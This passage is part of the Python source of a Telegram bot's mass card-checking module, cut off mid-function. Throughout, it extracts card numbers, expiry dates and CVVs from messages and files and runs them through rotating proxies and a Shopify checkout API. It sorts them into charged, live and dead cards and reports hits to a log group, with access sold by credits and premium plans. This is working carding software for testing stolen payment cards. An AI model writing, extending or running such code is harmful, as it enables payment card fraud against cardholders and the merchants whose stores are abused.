import asyncio
import aiohttp
import threading as _threading
import random
import re
import logging
import time
import string
import psycopg2.extras
import os
import urllib.parse
from datetime import datetime
from typing import Optional, Tuple, List
from io import BytesIO, RawIOBase
from collections import deque
from html import escape as html_escape

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AIogram Imports
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from aiogram import types, F, Router, Bot
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError
from aiogram.filters.callback_data import CallbackData

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOCAL IMPORTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from database import is_gate_enabled, get_user_credits, update_credits, update_user_stats, get_db_connection, deduct_credits_atomic, is_owner_user
from bin import get_bin_info
from sub import get_premium_status
from mass_gates._tg_helpers import send_hit, send_message_safe, safe_reply, edit_message_safe

_SHOPIFY_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURATION & URLS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

CUSTOM_CHARGED_EMOJI_ID = "5359719332542718652"
CUSTOM_APPROVED_EMOJI_ID = "6044254523009012231"
CUSTOM_DECLINED_EMOJI_ID = "5893081007153746175"
PROXY_LIVE_EMOJI = f'<tg-emoji emoji-id="{CUSTOM_APPROVED_EMOJI_ID}">✅</tg-emoji>'
PROXY_DEAD_EMOJI = f'<tg-emoji emoji-id="{CUSTOM_DECLINED_EMOJI_ID}">❌</tg-emoji>'
EMOJI_GATEWAY = f'<tg-emoji emoji-id="5085022089103016925">⚡</tg-emoji>'
EMOJI_PRICE = f'<tg-emoji emoji-id="5424976816530014958">👛</tg-emoji>'
EMOJI_BRAND = f'<tg-emoji emoji-id="6136275172283391020">⭐</tg-emoji>'
EMOJI_CARD = f'<tg-emoji emoji-id="4956719506027185156">💎</tg-emoji>'
EMOJI_ISSUER = f'<tg-emoji emoji-id="6136246765369694911">🦇</tg-emoji>'
EMOJI_COUNTRY = f'<tg-emoji emoji-id="5463071033256848094">🔝</tg-emoji>'
EMOJI_RESPONSE = f'<tg-emoji emoji-id="6136275172283391020">⭐</tg-emoji>'
EMOJI_USER = f'<tg-emoji emoji-id="5359719332542718652">💎</tg-emoji>'
EMOJI_DEV = f'<tg-emoji emoji-id="6255712466118905093">⚡</tg-emoji>'
EMOJI_PX = f'<tg-emoji emoji-id="6253702009107516178">⭐</tg-emoji>'
EMOJI_TYPE = f'<tg-emoji emoji-id="4956719506027185156">💎</tg-emoji>'
EMOJI_LEVEL = f'<tg-emoji emoji-id="6136275172283391020">⭐</tg-emoji>'

#BTN_CHARGED_EMOJI_ID = "5465465194056525619"
#BTN_DEAD_EMOJI_ID = "5042112436648281096"
#BTN_LIVE_EMOJI_ID = "5039793437776282663"
#BTN_STOP_EMOJI_ID = "6179444193518162239"
#BTN_ALL_EMOJI_ID = "4956324463525233747"

HIT_LOG_GROUP_ID = -1004453592223
EXTRA_CHARGED_GROUP_ID = -1004453592223

BUTTON_LOCK_SECONDS = 30

MSH_SESSIONS = {}
SESSION_LOCKS = {}

# Pending /msh selection state (before the user taps ▶ Start)
MSH_PENDING = {}   # sel_id -> {"user_id","cards","user_obj","proxies","is_group","charged","approved","msg_id","chat_id"}


def _selection_text(charged: bool, approved: bool, total: int) -> str:
    charged_s = "✅ 𝗢𝗡" if charged else "❌ 𝗢𝗙𝗙"
    approved_s = "✅ 𝗢𝗡" if approved else "❌ 𝗢𝗙𝗙"
    return (
        f"<b><tg-emoji emoji-id=\"5361734213370396027\">⚙️</tg-emoji> 𝐒𝐄𝐋𝐄𝐂𝐓𝐈𝐎𝐍</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>𝐓𝐨𝐭𝐚𝐥 𝐂𝐚𝐫𝐝𝐬 ➠</b> <code>{total}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"<tg-emoji emoji-id=\"{CUSTOM_CHARGED_EMOJI_ID}\">💎</tg-emoji> <b>𝐂𝐡𝐚𝐫𝐠𝐞𝐝 ➠</b> <b>{charged_s}</b>\n"
        f"<tg-emoji emoji-id=\"{CUSTOM_APPROVED_EMOJI_ID}\">✅</tg-emoji> <b>𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ➠</b> <b>{approved_s}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"<i>Tap the buttons to toggle what is sent to your DM, then press 𝐒𝐭𝐚𝐫𝐭.</i>"
    )


def _selection_keyboard(sel_id: str, charged: bool, approved: bool) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(
                text="𝐂𝐡𝐚𝐫𝐠𝐞𝐝",
                callback_data=MshSelCallback(sel_id=sel_id, action="charged").pack(),
                style="success" if charged else "primary",
                icon_custom_emoji_id=CUSTOM_CHARGED_EMOJI_ID,
            ),
            InlineKeyboardButton(
                text="𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝",
                callback_data=MshSelCallback(sel_id=sel_id, action="approved").pack(),
                style="success" if approved else "primary",
                icon_custom_emoji_id=CUSTOM_APPROVED_EMOJI_ID,
            ),
        ],
        [
            InlineKeyboardButton(
                text="𝐒𝐭𝐚𝐫𝐭",
                callback_data=MshSelCallback(sel_id=sel_id, action="start").pack(),
                style="primary",
            ),
        ],
    ])

# ── Shared HTTP session for MSH API calls (avoids per-card session creation) ──
_MSH_HTTP_SESSION = None

def _get_msh_http_session():
    global _MSH_HTTP_SESSION
    if _MSH_HTTP_SESSION is None or _MSH_HTTP_SESSION.closed:
        _MSH_HTTP_SESSION = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=130),
            connector=aiohttp.TCPConnector(limit=500, ssl=False)
        )
    return _MSH_HTTP_SESSION

# ── Session GC: prune stale sessions every 10 min to prevent memory leaks ─────
_MSH_SESSION_MAX_AGE = 3600

def _cleanup_msh_sessions():
    import time as _t
    cutoff = _t.time() - _MSH_SESSION_MAX_AGE
    dead = [sid for sid, s in list(MSH_SESSIONS.items())
            if s.get('status') in ('𝗦𝘂𝗺𝗺𝗮𝗿𝘆', '𝗦𝘁𝗼𝗽𝗽𝗲𝗱') and s.get('start_time', 0) < cutoff]
    for sid in dead:
        MSH_SESSIONS.pop(sid, None)
        SESSION_LOCKS.pop(sid, None)

def _start_msh_gc():
    import time as _t
    def _loop():
        while True:
            _t.sleep(600)
            try: _cleanup_msh_sessions()
            except Exception: pass
    _threading.Thread(target=_loop, daemon=True, name='msh_gc').start()

_start_msh_gc()


OWNER_ID = 8909940627

router = Router()

async def _safe_answer(callback: types.CallbackQuery, text: str = "", **kw):
    """Answer a callback query without ever raising (expired queries raise 400)."""
    try:
        await callback.answer(text, **kw)
    except Exception:
        pass




# kali_api (kali_api/main.py) - mass lane
API_BASE_URL = os.environ.get("KALI_API_URL", "http://127.0.0.1:8090/shopii")
API_KEY = os.environ.get("KALI_API_KEY", "ladle")

# site source: the v7 rotation list
SITES_FILE = os.environ.get("KALI_SITES_FILE", os.path.join(_SHOPIFY_DIR, "v7", "site.txt"))

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACK DATA
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class MshResultCallback(CallbackData, prefix="mshr"):
    session_id: str
    result_type: str

class MshStopCallback(CallbackData, prefix="mshs"):
    session_id: str

class MshSelCallback(CallbackData, prefix="mshsel"):
    sel_id: str
    action: str   # "charged" | "approved" | "start"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROXY MANAGER CLASS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class ProxyManager:
    """
    Proxy Manager - Only fails on REAL proxy errors.

    Key Features:
    - Does NOT fail on 429 rate limits (normal Shopify behavior)
    - Does NOT fail on card responses (DECLINED, APPROVED, 3DS, etc.)
    - Does NOT fail on Step 0-10 errors (retryable with new site)
    - ONLY fails on: connection timeouts, DNS errors, auth failures
    - Ensures proper http://user:pass@host:port format
    """

    SUCCESS_RESPONSES = [
        'CARD_DECLINED', 'ORDER_PAID', 'CHARGED', 'APPROVED',
        'INSUFFICIENT_FUNDS', 'INVALID_CVC', 'INCORRECT_CVC',
        '3DS_REQUIRED', 'DS_REQUIRED', 'FRAUD_SUSPECTED', 'GENERIC_ERROR',
        'DO_NOT_HONOR', 'EXPIRED_CARD',
        'INCORRECT_ZIP', 'STOLEN_CARD', 'LOST_CARD',
        'INCORRECT_NUMBER', 'AMOUNT_TOO_SMALL',
        'TRANSACTION_NOT_ALLOWED', 'RESTRICTED_CARD'
    ]

    PROXY_ERROR_PATTERNS = [
        'connection error', 'connection refused', 'connection reset',
        'timeout', 'timed out', 'connect timeout',
        'could not resolve host', 'dns error', 'name resolution',
        'proxy authentication', 'auth failed', '407',
        'tunnel failed', 'socks error', 'ssl error',
        'network unreachable', 'host unreachable',
        'connection aborted', 'broken pipe', 'socket error',
        'too many redirects', 'redirect loop',
        'ECONNREFUSED', 'ECONNRESET', 'ETIMEDOUT', 'ENOTFOUND',
        'proxy error', 'bad gateway'
    ]

    def __init__(self, proxies_list: List[str], session_id: str, user_id: Optional[int] = None):
        self.session_id = session_id
        self.user_id = user_id
        self.raw_proxies = list(set(proxies_list))

        self.all_proxies = [self._normalize_proxy(p) for p in self.raw_proxies]
        self.all_proxies = [p for p in self.all_proxies if p]

        self.proxy_queue = deque(self.all_proxies)
        self.failed_proxies = {}
        self.success_counts = {proxy: 0 for proxy in self.all_proxies}
        self.total_uses = 0
        self.cooldown_seconds = 60

        logging.info(f"[ProxyManager] Initialized with {len(self.all_proxies)} normalized proxies for session {session_id}")

    def _normalize_proxy(self, proxy: str) -> Optional[str]:
        if not proxy or not proxy.strip():
            return None

        proxy = proxy.strip()

        if proxy.startswith(('http://', 'https://')):
            return proxy
        if proxy.startswith('socks5://'):
            return 'http://' + proxy[9:]

        if '@' in proxy and ':' in proxy.split('@')[0]:
            return f'http://{proxy}'

        parts = proxy.split()
        if len(parts) == 4:
            user, pwd, host, port = parts
            return f'http://{user}:{pwd}@{host}:{port}'

        if ':' in proxy and '@' not in proxy:
            parts = proxy.split(':')
            if len(parts) == 2 and parts[1].isdigit():
                return f'http://{proxy}'

        return f'http://{proxy}'

    def get_next_proxy(self) -> Optional[Tuple[str, bool]]:
        if not self.all_proxies:
            return None, False

        current_time = time.time()
        attempts = 0
        max_attempts = len(self.all_proxies) * 2

        while attempts < max_attempts:
            if not self.proxy_queue:
                self.proxy_queue = deque(self.all_proxies)

            proxy = self.proxy_queue.popleft()

            if proxy in self.failed_proxies:
                fail_data = self.failed_proxies[proxy]
                cooldown_until = fail_data.get('cooldown_until', 0)

                if current_time < cooldown_until:
                    self.proxy_queue.append(proxy)
                    attempts += 1
                    continue
                else:
                    del self.failed_proxies[proxy]

            self.proxy_queue.append(proxy)
            self.total_uses += 1

            return proxy, True

        if self.failed_proxies:
            best_proxy = min(
                self.failed_proxies.keys(),
                key=lambda p: self.failed_proxies[p].get('cooldown_until', float('inf'))
            )
            logging.warning(f"[ProxyManager] All proxies in cooldown, forcing {mask_proxy(best_proxy)}")
            self.total_uses += 1
            return best_proxy, True

        return None, False

    def report_success(self, proxy: str):
        if proxy in self.success_counts:
            self.success_counts[proxy] += 1
        else:
            self.success_counts[proxy] = 1

        if proxy in self.failed_proxies:
            del self.failed_proxies[proxy]

    def is_real_proxy_error(self, api_response: str, http_status: Optional[int] = None) -> bool:
        response_lower = api_response.lower() if api_response else ''

        for success_indicator in self.SUCCESS_RESPONSES:
            if success_indicator.lower() in response_lower:
                return False

        if '429' in response_lower or 'too many requests' in response_lower:
            return False

        if any(x in response_lower for x in ['no available products', 'not shopify', 'site requires login']):
            return False

        if 'step ' in response_lower and ('failed' in response_lower or 'error' in response_lower):
            return False

        if any(x in response_lower for x in ['receipt', 'could not extract', 'missing']):
            return False

        if http_status and http_status in [200, 201, 400, 401, 402, 403, 422, 500]:
            return False

        for error_pattern in self.PROXY_ERROR_PATTERNS:
            if error_pattern in response_lower:
                return True

        return False

    def report_result(self, proxy: str, api_response: str, http_status: Optional[int] = None):
        current_time = time.time()

        if self.is_real_proxy_error(api_response, http_status):
            if proxy not in self.failed_proxies:
                self.failed_proxies[proxy] = {
                    'fail_count': 0,
                    'first_fail': current_time,
                    'last_fail': current_time,
                    'cooldown_until': 0
                }

            fail_data = self.failed_proxies[proxy]
            fail_data['fail_count'] += 1
            fail_data['last_fail'] = current_time

            # On the first real proxy error, test the proxy + remove it from
            # the user's /proxy DB pool if it is actually dead (item: /sh /msh
            # proxy_error -> check proxy -> prune if dead).
            if fail_data['fail_count'] == 1:
                try:
                    from proxy_pool import prune_proxy_if_dead
                    loop = asyncio.get_running_loop()
                    if self.user_id is not None:
                        loop.create_task(prune_proxy_if_dead(self.user_id, proxy))
                except Exception:
                    pass

            fail_count = fail_data['fail_count']
            cooldown_multipliers = [30, 60, 120, 300, 600, 900, 1800]
            multiplier_index = min(fail_count - 1, len(cooldown_multipliers) - 1)
            cooldown_duration = cooldown_multipliers[multiplier_index]

            fail_data['cooldown_until'] = current_time + cooldown_duration

            logging.warning(
                f"[ProxyManager] Proxy FAILED (real error): {mask_proxy(proxy)} "
                f"(#{fail_count}) Cooldown: {cooldown_duration}s | Response: {api_response[:80]}"
            )
        else:
            self.report_success(proxy)
            logging.debug(
                f"[ProxyManager] Proxy OK: {mask_proxy(proxy)} | "
                f"Response: {api_response[:60]}"
            )

    def get_stats(self) -> dict:
        active_count = len([p for p in self.all_proxies if p not in self.failed_proxies])
        failed_count = len(self.failed_proxies)

        return {
            'total_proxies': len(self.all_proxies),
            'active': active_count,
            'failed': failed_count,
            'total_uses': self.total_uses,
            'success_distribution': dict(self.success_counts)
        }

    def get_available_count(self) -> int:
        current_time = time.time()
        available = 0
        for proxy in self.all_proxies:
            if proxy in self.failed_proxies:
                if current_time >= self.failed_proxies[proxy].get('cooldown_until', 0):
                    available += 1
            else:
                available += 1
        return available


def mask_proxy(proxy: str) -> str:
    try:
        if '@' in proxy:
            parts = proxy.split('@')
            if len(parts) == 2:
                addr = parts[1]
                return f"***@{addr}"
        return proxy[:15] + "***" if len(proxy) > 15 else "***"
    except:
        return "***"

def build_user_link(user_obj) -> str:
    """
    Returns a properly clickable HTML hyperlink for the user.
    Uses https://t.me/username when username is available (works in all groups).
    Falls back to tg://user?id= for users without a username.
    Name is HTML-escaped to prevent Telegram parse errors with special characters.
    """
    name = html_escape(user_obj.first_name or "User")
    if user_obj.username:
        return f'<a href="https://t.me/{html_escape(user_obj.username)}">{name}</a>'
    return f'<a href="tg://user?id={user_obj.id}">{name}</a>'


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CARD EXTRACTION FUNCTIONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def parse_card_details(card_string: str) -> Optional[Tuple[str, str, str, str]]:
    card_string = card_string.strip()
    patterns = [
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        r'^(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})$',
        r'^(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})$',
        r'^(\d{13,19})\s*:\s*(\d{1,2})\s*:\s*(\d{2,4})\s*:\s*(\d{3,4})$',
        r'^(\d{13,19})\s*=\s*(\d{1,2})\s*=\s*(\d{2,4})\s*=\s*(\d{3,4})$',
        r'^\/[a-zA-Z]+\s+(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'^\/[a-zA-Z]+\s+(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})',
        r'^\/[a-zA-Z]+\s+(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        r'(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})',
        r'(\d{13,19})\s*:\s*(\d{1,2})\s*:\s*(\d{2,4})\s*:\s*(\d{3,4})',
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        r'(\d{13,19})\s*=\s*(\d{1,2})\s*=\s*(\d{2,4})\s*=\s*(\d{3,4})',
    ]

    for pattern in patterns:
        match = re.search(pattern, card_string)
        if match:
            groups = match.groups()
            if len(groups) == 5 and pattern.startswith(r'^\/[a-zA-Z]+\s+'):
                cc, mm, yy, cvv = groups[1], groups[2], groups[3], groups[4]
            elif len(groups) == 4:
                cc, mm, yy, cvv = groups
            else:
                continue
            month = mm.zfill(2)
            if len(yy) == 4:
                yy = yy[2:]
            return cc, month, yy, cvv
    return None

def extract_cards_from_text(text: str) -> List[str]:
    patterns = [
        r'(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})',
        r'(\d{13,19})\s*:\s*(\d{1,2})\s*:\s*(\d{2,4})\s*:\s*(\d{3,4})',
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        r'(\d{13,19})\s*=\s*(\d{1,2})\s*=\s*(\d{2,4})\s*=\s*(\d{3,4})',
        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s\|\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s(\d{1,2})\/(\d{2,4})\s(\d{3,4})',
    ]
    cards = []
    seen = set()
    for pattern in patterns:
        matches = re.findall(pattern, text)
        for match in matches:
            if len(match) == 4:
                card_number, month, year, cvv = match
                month = month.zfill(2)
                if len(year) == 4:
                    year = year[2:]
                card_string = f"{card_number}|{month}|{year}|{cvv}"
                if card_string not in seen:
                    seen.add(card_string)
                    cards.append(card_string)
    return cards


# ── Chunked file download (2MB chunks → low memory, fast) ──────────────────
_CHUNK_SIZE = 2 * 1024 * 1024


class _CardChunkSink(RawIOBase):
    """Streams a Telegram file download and extracts cards per ~2MB chunk."""

    def __init__(self, chunk_size=_CHUNK_SIZE):
        self._buf = b""
        self._chunk = chunk_size
        self.carry = ""
        self.cards = []
        self._seen = set()

    def writable(self):
        return True

    def seekable(self):
        return False

    def write(self, b):
        self._buf += bytes(b)
        while len(self._buf) >= self._chunk:
            self._process(self._buf[:self._chunk])
            self._buf = self._buf[self._chunk:]
        return len(b)

    def flush(self):
        pass

    def seek(self, offset, whence=0):
        return offset

    def _process(self, raw):
        text = self.carry + raw.decode("utf-8", errors="ignore")
        for c in extract_cards_from_text(text):
            if c not in self._seen:
                self._seen.add(c)
                self.cards.append(c)
        self.carry = text[-96:]

    def finalize(self):
        if self._buf:
            self._process(self._buf)
            self._buf = b""
        for c in extract_cards_from_text(self.carry):
            if c not in self._seen:
                self._seen.add(c)
                self.cards.append(c)
        self.carry = ""
        return self.cards


async def download_and_extract_chunked(bot, document) -> List[str]:
    """Download a document and extract cards in ~2MB chunks (low memory)."""
    file_info = await bot.get_file(document.file_id)
    sink = _CardChunkSink()
    # download_file() takes a file_PATH (download() takes a file_id).
    # Higher timeout: Telegram CDN can be slow for 10-20MB files.
    await bot.download_file(file_info.file_path, destination=sink, seek=False, timeout=120)
    return sink.finalize()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def log_hit_to_mshh(user_id, username, first_name):
    try:
        with open("mshh.txt", "a", encoding="utf-8") as f:
            u_name = username if username else "None"
            f_name = first_name if first_name else "Unknown"
            f.write(f"{user_id}|{u_name}|{f_name}\n")
    except Exception as e:
        logging.error(f"Error writing to mshh.txt: {e}")

# ══════════════════════════════════════════
# RETRY ERRORS - Site/Step Issues (Retry with NEW SITE)
# ══════════════════════════════════════════
RETRY_ERRORS = [
    'r4 token empty', 'payment method is not shopify!', 'r2 id empty',
    'product not found', 'hcaptcha detected', 'tax ammount empty',
    'del ammount empty', 'product id is empty', 'py id empty',
    'clinte token', 'hcaptcha_detected', 'receipt_empty', 'na',
    'site error! status: 429', 'site requires login!', 'failed to get token',
    'no valid products', 'not shopify!', 'site not supported for now!',
    'connection error', 'connection error!', 'error processing card',
    '504', 'server error', 'client error', 'failed',
    'token not found', 'invalid_response', 'resolve', 'item', 'curl error',
    'could not resolve host', 'connect tunnel failed',
    'timeout', 'proxy error',
    'api error', 'rejected', 'processing', 'poll failed', 'exceeded',

    # kali_api infra codes -> retry on a fresh site
    'no_products', 'cart_error', 'proposal_error', 'pci_error',
    'submit_error', 'poll_timeout', 'missing_site', 'no token/session',
    'step 0 failed',
    'step 1 failed',
    'step 2 failed',
    'step 3 failed',
    'step 4 failed',
    'step 5 failed',
    'step 6 failed',
    'step 7 failed',
    'step 8 failed',
    'step 9 failed',
    'step 10 failed',

    'no available products found',
    'could not extract receiptid',
    'could not extract signedhandles',
    'receiptid missing',
    'response missing receiptid',
    'products.json',
    'returned status 429',
    'returned status 500',
    'returned status 502',
    'returned status 503',
    'returned status 504',
    'store incompatible',
    'extract signedHandles',
    'missing receiptId',
]

REACTIONS = [
    "airkiss", "blush", "brofist", "celebrate", "cheers", "clap",
    "cool", "cuddle", "dance", "handhold", "happy", "hug",
    "kiss", "laugh", "lick", "love", "nervous", "nom",
    "nuzzle", "nyah", "pat", "peek", "shy", "sip",
    "sleep", "smile", "smug", "sorry", "thumbsup",
    "tickle", "tired", "wave", "wink", "yay", "yes"
]

def is_session_stopped(session_id: str) -> bool:
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return True
    return session.get('status') == "𝗦𝘁𝗼𝗽𝗽𝗲𝗱"

def is_buttons_locked(session_id: str) -> bool:
    session = MSH_SESSIONS.get(session_id)
    if not session: return False
    elapsed = time.time() - session.get('start_time', 0)
    return elapsed < BUTTON_LOCK_SECONDS

def get_remaining_lock(session_id: str) -> int:
    session = MSH_SESSIONS.get(session_id)
    if not session: return 0
    elapsed = time.time() - session.get('start_time', 0)
    remaining = BUTTON_LOCK_SECONDS - elapsed
    return max(0, int(remaining) + 1)

async def get_anime_gif():
    import aiohttp
    reaction = random.choice(REACTIONS)
    api_url = f"https://api.otakugifs.xyz/gif?reaction={reaction}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=3) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return data.get("url")
    except Exception as e:
        logging.error(f"Error fetching anime gif: {e}")
    return "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExM3Z6eXF6eXF6eXF6eXF6eXF6SZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/LdOyjZ7h5xS3yCjQ8I/giphy.gif"

async def get_user_plan_name(user_id):
    if user_id == OWNER_ID:
        return "OWNER"
    is_premium, _ = get_premium_status(user_id)
    if is_premium:
        try:
            def _sync_fetch():
                conn = get_db_connection()
                cursor = conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
                cursor.execute("SELECT plan FROM receipts WHERE user_id = %s ORDER BY purchased_on DESC LIMIT 1", (user_id,))
                row = cursor.fetchone()
                conn.close()
                return row['plan'].upper() if row else "PREMIUM"
            return await asyncio.to_thread(_sync_fetch)
        except Exception as e:
            logging.error(f"Error fetching plan name: {e}")
        return "PREMIUM"
    else:
        return "TRIAL"

async def get_user_proxies(user_id):
    """Per-user proxies from the DB (/proxy pool). No proxy.txt fallback."""
    from proxy_pool import get_user_proxies as _db_get
    return await _db_get(user_id)

def luhn_check(card_number: str) -> bool:
    card_number = str(card_number).strip()
    if not card_number.isdigit():
        return False
    total = 0
    reverse_digits = card_number[::-1]
    for i, char in enumerate(reverse_digits):
        digit = int(char)
        if i % 2 == 1:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
    return total % 10 == 0

def is_expired(mm: str, yy: str) -> bool:
    try:
        current_date = datetime.now()
        current_year = current_date.year % 100
        current_month = current_date.month
        exp_year = int(yy)
        exp_month = int(mm)
        if exp_year < current_year:
            return True
        elif exp_year == current_year:
            if exp_month < current_month:
                return True
        return False
    except ValueError:
        return True

def get_sites():
    sites = []
    try:
        if os.path.exists(SITES_FILE):
            with open(SITES_FILE, "r", encoding="utf-8", errors="ignore") as f:
                sites = [line.strip() for line in f if line.strip()]
    except Exception as e:
        logging.error(f"Error reading {SITES_FILE}: {e}")
    return sites

def get_user_display(user_obj, plan_name):
    return f"{user_obj.first_name} [{plan_name}]"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# API PROCESSING FUNCTION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_card_api(cc: str, mes: str, ano: str, cvv: str, site: str, proxy: str) -> Tuple[bool, str, str, str, str, str, str, int]:
    """
    Process card using the API endpoint.

    Returns:
        Tuple of (success, message, url, gateway, price, currency, proxy_status, http_status)
    """
    import aiohttp

    cc_formatted = f"{cc}|{mes}|{ano[-2:]}|{cvv}"
    api_url = API_BASE_URL + "?" + urllib.parse.urlencode(
        {"cc": cc_formatted, "site": site, "proxy": proxy, "key": API_KEY}
    )

    logging.debug(f"[API] Processing {cc[:6]}**** via {mask_proxy(proxy)}")

    http_status = None

    try:
        _http = _get_msh_http_session()
        async with _http.get(api_url) as response:
            http_status = response.status

            if response.status == 200:
                data = await response.json()

                gateway = data.get("Gateway", "Shopify Payments")
                price = data.get("Price", "0.00")
                proxy_raw = data.get("Proxy", "Dead")
                api_response = data.get("Response", "Unknown Error")
                status = data.get("Status", "false")

                success = status.lower() == "true"

                if "live" in str(proxy_raw).lower():
                    proxy_status = "Live"
                else:
                    proxy_status = "Dead"

                return (
                    success,
                    api_response,
                    site,
                    gateway,
                    price,
                    "USD",
                    proxy_status,
                    http_status
                )
            else:
                try:
                    err_body = await response.json()
                    err_resp = err_body.get("Response") or f"HTTP {response.status}"
                except Exception:
                    err_resp = f"API Error: HTTP {response.status}"
                return (
                    False,
                    err_resp,
                    site,
                    "Shopify Payments",
                    "0.00",
                    "USD",
                    "Error",
                    http_status
                )

    except asyncio.CancelledError:
        raise
    except aiohttp.ClientError as e:
        return (
            False,
            f"Connection Error: {str(e)}",
            site,
            "Shopify Payments",
            "0.00",
            "USD",
            "Error",
            None
        )
    except Exception as e:
        return (
            False,
            f"Error: {str(e)}",
            site,
            "Shopify Payments",
            "0.00",
            "USD",
            "Error",
            None
        )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESULT FILE GENERATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def generate_result_file(session: dict, result_type: str, user_obj, plan_name: str) -> Tuple[BytesIO, str, int]:
    cards_list = []

    if result_type == "charged":
        cards_list = session.get('charged_cards', [])
        type_label = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝"
        type_emoji = "💎"
    elif result_type == "live":
        cards_list = session.get('live_cards', [])
        type_label = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝"
        type_emoji = "✅"
    elif result_type == "dead":
        cards_list = session.get('dead_cards', [])
        type_label = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝"
        type_emoji = "❌"
    else:
        cards_list = (
            session.get('charged_cards', []) +
            session.get('live_cards', []) +
            session.get('dead_cards', []) +
            session.get('error_cards', [])
        )
        type_label = "𝐀𝐥𝐥"
        type_emoji = "📁"

    total_count = len(cards_list)
    user_display = get_user_display(user_obj, plan_name)

    lines = []
    lines.append("┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
    lines.append("┃         𝑪𝑯𝑶𝑹 𝑷𝑨𝑳𝑻𝑨𝑵          ┃")
    lines.append("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
    lines.append("")
